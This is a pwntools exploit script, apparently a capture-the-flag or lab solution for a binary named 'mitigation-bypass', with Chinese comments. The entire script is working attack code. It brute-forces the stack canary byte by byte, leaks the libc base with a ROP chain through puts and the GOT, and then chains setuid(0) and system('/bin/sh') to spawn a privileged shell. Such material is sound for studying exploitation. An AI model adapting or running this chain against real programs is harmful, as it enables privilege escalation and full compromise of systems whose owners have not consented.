from pwn import *
import time
context.update(arch='amd64')

binary = '/challenge/mitigation-bypass'
libc = ELF('/challenge/libc.so.6')
context.binary = binary
elf = ELF(binary)
p = process(binary)

# Canary 爆破
offset = 103
canary = b'\x00'
for i in range(8):
    for j in range(0, 256):
        payload = b'a' * offset + canary + p8(j)
        p.send(payload)
        time.sleep(0.05)
        res = p.recv()
        if ( b"stack smashing detected" not in res):
            print(f'{i} <-> {hex(j)}')
            canary += p8(j)
            break
    assert(len(canary) == i+2)     
print(f'Canary : {canary.hex()}')

# Libc 地址泄漏
pop_rdi_ret = next(elf.search(asm('pop rdi; ret'), executable=True))
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

payload = b'A' * offset + canary + p64(0)
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_plt) + p64(main_addr)

p.sendline(payload)
libc_base = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00')) - libc.sym['puts']
log.info(f'Libc base: {hex(libc_base)}')

# 构造最终 ROP 链
context.log_level = 'debug' 
setuid_addr = libc_base + libc.sym['setuid']  # 动态计算 setuid 函数地址
system_addr = libc_base + libc.sym['system']  # 动态计算 system 函数地址
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))  # 动态计算 "/bin/sh" 字符串地址

p.recvuntil('pwn me :)\n')
payload = b'A' * offset + canary + p64(0)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(setuid_addr)
payload += p64(pop_rdi_ret) + p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
